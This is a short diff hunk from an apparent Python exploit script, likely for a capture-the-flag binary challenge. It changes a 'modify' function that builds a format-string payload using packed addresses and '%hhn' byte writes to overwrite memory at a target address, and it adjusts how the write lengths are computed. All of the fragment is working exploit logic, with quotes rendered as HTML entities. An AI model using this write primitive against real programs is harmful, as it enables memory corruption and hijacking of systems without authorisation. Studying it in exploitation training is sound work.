@@ -361,9 +361,9 @@ def modify(target,offset,old):
 
     payload=p32(old)+p32(old+1)+p32(old+2)+p32(old+3)
     len1=get(t1,len(payload))
-    len2=get(t2,t1)
-    len3=get(t3,t2)
-    len4=get(t4,t3)
+    len2=get(t2,(len1)+16)
+    len3=get(t3,(len2+len1)+16)
+    len4=get(t4,(len3+len2+len1)+16)
     payload+=&apos;%&apos;+str(len1)+&apos;c&apos;+&apos;%&apos;+str(offset)+&apos;$hhn&apos;
     payload+=&apos;%&apos;+str(len2)+&apos;c&apos;+&apos;%&apos;+str(offset+1)+&apos;$hhn&apos;
     payload+=&apos;%&apos;+str(len3)+&apos;c&apos;+&apos;%&apos;+str(offset+2)+&apos;$hhn&apos;
